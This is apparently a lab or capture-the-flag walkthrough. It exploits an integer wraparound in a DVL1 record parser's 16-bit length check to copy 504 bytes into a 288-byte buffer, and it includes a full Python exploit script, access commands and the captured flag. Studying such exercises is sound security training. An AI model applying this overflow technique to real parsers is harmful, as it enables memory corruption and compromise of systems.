# W31.2 Walkthrough: Past the parser's boundary

Build a DVL1 record that passes the 16-bit length check but copies more bytes than
the workspace holds. The parser validates only `(declared_length + header_length)
mod 2^16 <= 504`, then copies `header_length` bytes into the 288-byte workspace.

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user fieldlink --workdir /var/lib/fieldlink-connector cinder-arwc-connector bash -l
```

Prerequisite: W31.1 (`receipts/process-session`).

## DVL1 record format

Bytes: `"DVL1"` (0:4), `declared_length` u16-le (4:6), `header_length` u16-le (6:8),
`CRC32C` u32-le (8:12), payload (12:end). CRC32C covers the record from byte 12 to
the end. The witness uses `declared_length=0xfe08` and `header_length=0x1f8`, so the
sum wraps to 0 and the full request is 512 bytes.

## Step 1: send the boundary record (W31.2 acceptance check)

```python
import json, ssl, urllib.request, pathlib, base64, struct
ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
ps = pathlib.Path("receipts/process-session").read_text().strip()
H = {"Authorization": "Bearer " + ps, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

def crc32c(data):
    crc = 0xffffffff
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0x82f63b78 if (crc & 1) else (crc >> 1)
    return crc ^ 0xffffffff

rec = bytearray(b"DVL1") + struct.pack("<H", 0xfe08) + struct.pack("<H", 0x1f8) + struct.pack("<I", 0) + bytes(500)
rec[8:12] = struct.pack("<I", crc32c(bytes(rec[12:])))
body = json.dumps({"case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
                   "record_b64": base64.b64encode(bytes(rec)).decode()}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://process-view.arwc.test/api/signature-records/current",
                           data=body, headers=H, method="POST"), context=ctx).read())
print("flag:", d["flag"])
```

Output `flag: FLAG{efc608d7e3b45ea7}`. The record `DVL-BOUNDARY-CRR-R5` reports
`copied_bytes=504` into a 288-byte workspace.
